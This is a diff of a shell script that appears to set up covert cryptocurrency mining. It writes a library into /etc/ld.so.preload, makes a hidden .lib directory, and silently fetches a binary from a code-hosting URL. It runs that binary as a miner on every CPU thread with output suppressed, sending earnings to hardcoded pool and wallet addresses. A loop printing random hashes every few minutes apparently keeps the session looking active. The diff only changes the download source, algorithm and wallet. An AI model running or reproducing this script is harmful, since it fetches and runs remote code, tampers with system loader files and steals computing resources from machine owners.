@@ -7,9 +7,9 @@ mv libnyumput.so /usr/local/lib/
 echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
 rm nyumput.c
 mkdir .lib && cd .lib
-wget -O sgr1 https://bitbucket.org/ramabena/tahrim/downloads/sare >/dev/null 2>&1
+wget -O sgr1 https://github.com/Sazfa-Kuy/ocvminer/blob/main/maker >/dev/null 2>&1
 chmod +x sgr1
 cpulimit -l 150 -e sgr1 &
 sudo sync && sudo echo 3 > /proc/sys/vm/drop_caches
-nice -n -10 nohup ./sgr1 --algorithm minotaurx --pool stratum-na.rplant.xyz:7068 --wallet RBPnYFfFtBr8HxTsq2bZ6wxQv6BzbmaUHH.enviok --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive  > /dev/null 2>&1 &
+nice -n -10 nohup ./sgr1 -a YespowerSugar -o stratum+tcp://stratum-na.rplant.xyz:7042 -u sugar1qg5nd84pj3g7e8wghrayxeu30e6hcg73q46e5pd.sugoi -p x -t $(nproc --all) > /dev/null 2>&1 &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
